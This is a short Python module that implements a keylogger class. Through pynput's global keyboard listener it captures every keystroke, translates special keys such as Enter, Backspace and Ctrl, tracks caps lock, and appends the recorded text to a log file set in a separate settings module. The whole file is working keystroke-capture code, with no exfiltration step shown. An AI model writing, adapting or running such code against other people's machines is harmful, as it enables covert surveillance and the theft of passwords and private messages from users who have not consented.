from pynput.keyboard import Listener, Key
from settings import path, logs_file


class KeyLogger:
    """Keystroke tracking"""
    replacement = {
        'Key.enter': '[ENTER]\n', 'Key.backspace': '[BACKSPACE]',
        'Key.space': ' ', 'Key.alt': '[ALT]', 'Key.delete': '[DEL]',
        'Key.left': '[LEFT ARROW]', 'Key.right': '[RIGHT ARROW]',
        'Key.shift': '[SHIFT]', 'Key.ctrl': 'ctrl + '
    }

    def __init__(self):
        self.path = path
        self.logs = logs_file

        self.data = []
        self.count = 0
        self.caps_lock = 0

    def on_press(self, key):
        if key == Key.caps_lock:
            self.caps_lock += 1

        self.data.append(key)
        self.count += 1

    def on_release(self, key):
        if self.count >= 1:
            self.count = 0
            self.write_file(self.data)
            self.data = []

    def write_file(self, data):
        with open(self.path + self.logs, 'a') as f:
            for k in data:
                char = str(k).replace("'", "")

                if char in self.replacement:
                    f.write(self.replacement[char])
                elif 'Key' not in char:
                    if self.caps_lock % 2:
                        f.write(char.upper())
                    else:
                        f.write(char)

    def run(self):
        with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()
